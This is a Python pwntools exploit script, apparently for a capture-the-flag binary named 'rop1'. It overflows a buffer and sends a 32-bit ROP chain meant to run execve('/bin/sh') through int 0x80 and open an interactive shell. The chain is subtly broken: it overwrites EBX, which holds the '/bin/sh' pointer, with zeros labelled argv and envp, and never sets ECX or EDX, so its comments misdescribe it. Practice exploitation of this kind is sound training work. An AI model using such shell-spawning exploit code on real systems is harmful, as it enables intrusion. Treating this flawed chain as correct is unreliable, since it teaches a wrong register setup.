from pwn import *

# Configure pwntools
context.arch = 'i386'
context.os = 'linux'
context.word_size = 32

# Create process
elf = ELF('./rop1')
p = process('./rop1')

# ROP gadgets (Updated with correct addresses from ropper)
POP_EAX = 0x080491c9  # pop eax; ret
POP_EBX = 0x0804901e  # pop ebx; ret
INT_80  = 0x080491e3  # int 0x80; nop; nop; ret

# First create a simple execve("/bin/sh", 0, 0) ROP chain
payload = b"A" * 16           # Buffer padding

# Set up execve("/bin/sh", 0, 0)
payload += p32(POP_EAX)       # Load syscall number
payload += p32(0xb)           # execve is syscall 11
payload += p32(POP_EBX)       # Load pointer to "/bin/sh"
payload += p32(0x0804b008)    # Address where "/bin/sh" is stored
payload += p32(POP_EBX)       # Setup null environment
payload += p32(0)             # NULL for argv
payload += p32(POP_EBX)       # Setup null environment
payload += p32(0)             # NULL for envp
payload += p32(INT_80)        # Execute syscall

print("[*] Sending payload of length:", len(payload))
p.sendline(payload)
p.interactive()
